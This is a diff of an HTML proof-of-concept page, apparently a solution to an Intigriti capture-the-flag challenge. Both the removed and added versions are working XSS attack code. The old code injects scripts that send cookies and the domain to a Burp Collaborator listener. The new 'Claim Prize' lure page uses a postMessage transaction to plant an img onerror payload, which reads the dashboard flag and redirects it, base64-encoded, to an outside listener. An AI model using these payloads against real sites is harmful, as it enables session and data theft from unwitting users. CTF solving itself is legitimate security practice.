@@ -1,49 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>XSS PoC</title>
+    <meta charset="UTF-8">
+    <title>Claim Prize</title>
+    <style>
+        /* Make the button fill the screen so the bot definitely clicks it */
+        body, html { margin: 0; padding: 0; height: 100%; }
+        button {
+            width: 100%;
+            height: 100%;
+            font-size: 3em;
+            background: #00FF88;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-<script>
-const collab = 'tkhc89fc2l3thl98ptwzq8tu6lcc06ov.oastify.com';
+    <button onclick="startExploit()">CLICK TO VERIFY</button>
 
-// Multiple injection methods
-const methods = [
-    // Method 1: Iframe with src
-    () => {
-        const iframe = document.createElement('iframe');
-        iframe.src = `/api/wallets?filter=<script>fetch('http://${collab}/m1'+document.cookie.substr(0,50))<\/script>`;
-        document.body.appendChild(iframe);
-    },
-    
-    // Method 2: Iframe with srcdoc (fetch first)
-    () => {
-        fetch(`/api/wallets?filter=<script>fetch('http://${collab}/m2'+document.domain)<\/script>`, {credentials: 'include'})
-            .then(r => r.text())
-            .then(t => {
-                const iframe = document.createElement('iframe');
-                iframe.srcdoc = t;
-                document.body.appendChild(iframe);
-            });
-    },
-    
-    // Method 3: Image with error handler
-    () => {
-        const img = document.createElement('img');
-        img.src = 'x';
-        img.onerror = () => {
-            fetch(`/api/wallets?filter=<img src=x onerror="fetch('http://${collab}/m3')">`, {credentials: 'include'})
-                .then(r => r.text())
-                .then(t => document.body.innerHTML += t);
-        };
-        document.body.appendChild(img);
-    }
-];
+    <script>
+        // CONFIGURATION
+        const BASE_URL = 'https://challenge-0126.intigriti.io';
+        // YOUR BURP COLLABORATOR
+        const LISTENER = 'https://qa49y659sitq7iz5fqmwg5jrwi29qzeo.oastify.com';
 
-// Execute all methods
-methods.forEach((method, i) => {
-    setTimeout(() => method(), i * 1000);
-});
-</script>
+        function startExploit() {
+            // 1. Open Checkout in a new tab (This sends Cookies!)
+            // We use a reference 'win' to talk to it
+            const win = window.open(BASE_URL + '/checkout.html?currency=1337COIN&price=1', '_blank');
+
+            // 2. Wait for the window to load
+            setTimeout(() => {
+                
+                // --- THE PAYLOAD ---
+                // 1. Fetch dashboard.html (where the flag is)
+                // 2. Extract the flag using Regex
+                // 3. Exfiltrate to your listener
+                const jsCode = `
+                    fetch('/dashboard.html')
+                    .then(r => r.text())
+                    .then(html => {
+                        const match = html.match(/INTIGRITI\\{.*?\\}/);
+                        const flag = match ? match[0] : 'FLAG_NOT_FOUND';
+                        window.location = '${LISTENER}/?flag=' + btoa(flag);
+                    })
+                `;
+
+                // Clean the code for injection
+                const flatCode = jsCode.replace(/\n/g, ' ');
+                // Break out of title="" attribute
+                const xss = `"><img src=x onerror="${flatCode}">`;
+
+                // 3. Send the POST Message
+                // Since 'win' was opened by us, we can send messages to it!
+                win.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        currency: '1337COIN', // Admin has this currency
+                        amount: 1337, 
+                        toAddress: xss
+                    }
+                }, '*');
+
+                // 4. Redirect the popup to MarketWatch to trigger the XSS
+                setTimeout(() => {
+                    win.location = BASE_URL + '/marketwatch.html';
+                }, 1500);
+
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
